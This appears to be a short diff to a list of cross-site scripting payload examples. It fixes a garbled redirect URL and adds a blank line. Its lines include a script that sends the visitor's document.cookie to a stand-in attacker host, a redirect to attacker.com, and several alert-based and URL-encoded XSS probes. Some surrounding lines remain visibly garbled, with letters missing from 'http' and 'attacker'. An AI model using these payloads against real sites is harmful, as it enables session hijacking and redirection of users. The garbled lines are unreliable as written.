@@ -6,7 +6,7 @@
 <script>fetch('h p://a acker.com/log?cookie=' + document.cookie);</script> 
 2. Redirec ng the User: 
 
-<script>window.loca on='h p://a acker.com'</script> 
+<script>window.location='http://attacker.com'</script> 
 
 <input type="text" value="<script>alert(123)</script>">
 
@@ -16,6 +16,7 @@
 <img src=x onerror=alert('XSS')> 
 
 Or encoded version: 
+
 
 %3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E 
 
